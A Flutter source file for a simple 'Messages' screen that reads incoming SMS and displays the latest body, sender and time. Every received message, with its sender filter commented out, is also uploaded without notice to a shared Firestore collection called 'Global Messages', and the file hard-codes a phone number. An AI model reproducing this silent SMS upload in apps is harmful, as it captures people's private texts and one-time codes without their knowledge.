import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:readsms/readsms.dart';

class ReadWidget extends StatefulWidget {
  const ReadWidget({super.key});

  @override
  State<ReadWidget> createState() => _ReadWidgetState();
}

class _ReadWidgetState extends State<ReadWidget> {
  final _plugin = Readsms();

  String senderMobileNO = '+919763376596';
  String sms = 'no sms received';
  String sender = 'no sms received';
  String time = 'no sms received';
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;

  @override
  void initState() {
    super.initState();
    getPermission().then((value) {
      if (value) {
        _plugin.read();
        _plugin.smsStream.listen((event) {
          // if (event.sender.toString() == senderMobileNO) {
          setState(() {
            sms = event.body;
            sender = event.sender;
            time = event.timeReceived.toString();
            addSmsToFireStore(sms, sender, time);
          });
          // }
        });
      }
    });
  }

  void addSmsToFireStore(String sms, String sender, String time) {
    _firestore
        .collection('Global Messages')
        .add({'sms': sms, 'sender': sender, 'time': time});
  }

  Future<bool> getPermission() async {
    if (await Permission.sms.status == PermissionStatus.granted) {
      return true;
    } else {
      if (await Permission.sms.request() == PermissionStatus.granted) {
        return true;
      } else {
        return false;
      }
    }
  }

  @override
  void dispose() {
    super.dispose();
    _plugin.dispose();
  }

  //List<Map<String, dynamic>> smsList = [];

  /*void addSms(String sms, String sender, String time) {
    Map<String, dynamic> smsData = {
      'sms': sms,
      'sender': sender,
      'time': time,
    };
    setState(() {
      smsList.add(smsData);
    });
  }*/

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
        debugShowCheckedModeBanner: false,
        home: Scaffold(
          appBar: AppBar(
            title: const Text(
              "Messages",
              style: TextStyle(fontWeight: FontWeight.bold),
            ),
            shadowColor: Colors.grey,
            elevation: 10,
          ),
          body: Padding(
            padding: const EdgeInsets.all(5.0),
            child: Card(
              shadowColor: Colors.grey,
              elevation: 10,
              child: SizedBox(
                height: 100,
                width: double.infinity,
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      'new sms received: $sms',
                      textAlign: TextAlign.start,
                      style: const TextStyle(
                          fontWeight: FontWeight.bold, fontSize: 14),
                    ),
                    Text(
                      'new sms Sender: $sender',
                      textAlign: TextAlign.start,
                      style: const TextStyle(
                          fontWeight: FontWeight.bold, fontSize: 14),
                    ),
                    Text(
                      'new sms time: $time',
                      textAlign: TextAlign.start,
                      style: const TextStyle(
                          fontWeight: FontWeight.bold, fontSize: 14),
                    ),
                  ],
                ),
              ),
            ),
          ),
          /* body: ListView.separated(
            itemCount: smsList.length,
            separatorBuilder: (BuildContext context, int index) => const Divider(),
            itemBuilder: (BuildContext context, int index) {
              final sms = smsList[index];
              return Padding(
                padding: const EdgeInsets.all(5.0),
                child: Card(
                  shadowColor: Colors.grey,
                  elevation: 10,
                  child: SizedBox(
                    height: 100,
                    width: double.infinity,
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Text(
                          'new sms received: ${sms['sms']}',
                          textAlign: TextAlign.start,
                          style: const TextStyle(
                              fontWeight: FontWeight.bold, fontSize: 14),
                        ),
                        Text(
                          'new sms Sender: ${sms['sender']}',
                          textAlign: TextAlign.start,
                          style: const TextStyle(
                              fontWeight: FontWeight.bold, fontSize: 14),
                        ),
                        Text(
                          'new sms time: ${sms['time']}',
                          textAlign: TextAlign.start,
                          style: const TextStyle(
                              fontWeight: FontWeight.bold, fontSize: 14),
                        ),
                      ],
                    ),
                  ),
                ),
              );
            },
          )*/
        ));
  }
}
